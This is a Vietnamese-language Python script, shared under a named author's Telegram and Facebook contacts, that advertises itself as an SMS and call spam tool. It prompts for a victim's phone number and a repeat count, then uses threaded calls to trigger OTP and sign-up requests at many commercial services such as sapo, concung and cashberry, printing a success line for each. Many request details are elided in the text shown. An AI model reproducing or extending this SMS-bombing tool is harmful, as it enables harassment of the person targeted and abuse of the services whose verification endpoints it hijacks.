...
CONNECTED TO SERVER...
  ...
  ███████▄░░░░░░░░░░░▄███████
  ██████████▄▄▄▄▄▄▄██████████
  !! TOOL SPAM CALL/SMS VIP !!
#====================================================
# ©Coppyright: 亗AWM๛Baby Software                  
# ⚜Telegram : AwmxBaby
#====================================================  
#====================================================                
# \033[1;34  「  https://t.me/AwmxBabySoftware  」     
# 「 https://www.facebook.com/linh.florence.2000 」
#====================================================
\033[1;34m#====================================================
\033[1;34m#   Lưu Ý:
# • Sau khi spam để tầm 30s->1p để tool hoạt động.
# • Nên để số lần spam là 5.
# • Có thắc mắc liên hệ Telegram: AwmxBaby
\033[1;34m#====================================================
"""
def banner():
  os.system("clear")
  for h in ban:
    ...
    time.sleep(0.001)
banner()
sdt = input("\033[1;35mSỐ ĐIỆN THOẠI MUỐN SPAM : ")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print("SAI ĐỊNH DẠNG VUI LÒNG NHẬP LẠI")
  sdt = input("SỐ ĐIỆN THOẠI MUỐN SPAM : ")
count = int(input("\033[0;31m NHẬP SỐ LẦN SPAM : "))
if sdt == "0868841846":
  print("SPAM CÁI CON MẸ MÀY")
  quit()
...
def pizzacompany(sdt):
  ...
  print("|SPAM|---->THÀNH CÔNG|pizzacompany|")
def onecredit(sdt):
  cookies = {
  ...
  print("|spam|---->thành công|onecredit|")
def concung(sdt):
  cookies = {
...
def thantaioi():
  ...
  print("|spam|---->thành công|thantaioi|")
def meta(sdt):
...
def shopiness(sdt):
  ...
  print("|SPAM|---->THÀNH CÔNG|shopiness|")
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
...
def alfrescos(sdt):
  ...
  print("|spam|---->thành công|alfrescos|")
def poyeye(sdt):
...
def best_inc(sdt):
  ...
  print("|spam|---->thành công|best_inc|")
def sapo(sdt):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
...
def cashberry(sdt):
  ...
  print("|spam|---->thành công|cashberry|🤣")
...
def kimungvay(sdt):
  ...
  print("|spam|---->thành công|kimungvay|🤣")
# hàm chạy


def run(sdt,i):
  threading.submit(regthantaioi,sdt)
  time.sleep(1)
  ...
  time.sleep(1)
  threading.submit(itaphoa,sdt)
  time.sleep(1)
  threading.submit(findo,sdt)
  time.sleep(1)
  threading.submit(beecow,sdt)
  time.sleep(1)
  threading.submit(cashberry,sdt)
  time.sleep(1)
  threading.submit(takomo,sdt)
  time.sleep(1)
  threading.submit(kimungvay,sdt)
  time.sleep(1)
  threading.submit(thantaioi)
